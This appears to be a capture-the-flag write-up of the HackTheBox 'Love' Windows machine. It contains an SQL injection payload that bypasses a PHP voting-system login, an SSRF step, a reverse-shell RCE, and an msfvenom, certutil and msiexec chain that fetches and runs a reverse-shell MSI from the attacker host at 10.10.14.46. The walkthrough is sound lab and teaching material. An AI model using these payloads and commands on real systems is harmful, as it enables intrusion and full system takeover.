---
title: Love Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

## Enumeration

```ruby
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
| http-cookie-flags: 
| /: 
|_HTTP-TITLE: VOTING SYSTEM USING PHP |_HTTP-COOKIE-FLAGS: |: 
|_ httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
| tls-alpn: 
|_ http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
|_ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
|_Not valid before: 2021-01-18T14:00:16
|_Not valid after: 2022-01-18T14:00:16
445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5040/tcp open unknown
7680/tcp open pando-pub?
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
| 311: 
|_ Message signing enabled but not required
| smb2-time: 
| date: 2023-02-07T19:22:11
|_ start_date: N/A
| smb-security-mode: 
| account_used: <blank>
| authentication_level: user
|_ challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
| OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
| OS CPE: cpe:/o:microsoft:windows_10::-
| Computer name: Love
| NetBIOS computer name: LOVE\x00
| Workgroup: WORKGROUP\x00
|_ System time: 2023-02-07T11:22:12-08:00
|_clock-skew: mean: 3h01m33s, deviation: 4h37m09s, median: 21m31s
```

We can observe the domain `staging.love.htb`. 
Also note the presence of port 5000, which we cannot access at the moment.

## User Exploit

If we access the domain, we can see how we are facing a voting system created in PHP, so let's look for an exploit:

Luckily we found a SQL inejction that allows us to bypass the authentication process: `php/webapps/49843.txt.

Which says that if we put the following payload in the login window of /admin/: 

```
login=yea&password=admin&username=dsfgdf' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VKK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- - -
```

We bypass the login panel. And as we can see: if we intercept the request with burpsuite and enter the data, we get into the admin account.

However, for now we can't do much, so let's go to the other page.

If we click on home, we see that we have a URL scanner, in which if we put http://127.0.0.1 , we can make a SSRF, so let's take advantage of it.

We are going to try to see what is in the port 5000: And it gives us some credentials to enter the voting system as admin. However, this is of little use, since we have already bypassed it previously. 

If we look again at some exploit with searchsploit, we find a RCE but for when we are authenticated. As we are already authenticated, we are going to use it.

However, the exploit will not work at all. This is because the exploit is trying to access /voting_system. As this does not exist, let's remove it from the script.

And we would get the reverse shell. 

## Root Exploit

To find a way to escalate privileges, let's download WinPeas, pass it to the victim machine and run it:

And we see that AlwaysInstallElevated is installed and its value is 1.

We see that in hacktricks there is an article to escalate privileges using this vulnerability:
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.46 LPORT=443 --platform windows -a x64 -f msi -o reverse.msi
```

This will create a file called reverse.msi, which we will have to upload to the victim machine:

To do this we start a server with python on our local machine and run the following command on the victim machine:

```powershell
certutil.exe -f -urlcache -split http://10.10.14.46:8000/reverse.msi reverse.msi
```

Once we have it uploaded, we listen on the port that we have defined when creating the file with metasploit and we will run it: 
```PowerShell
msiexec /quiet /qn /i /reverse.msi 
```

And we will receive the shell as Admin and we will be able to read the root.txt flag.



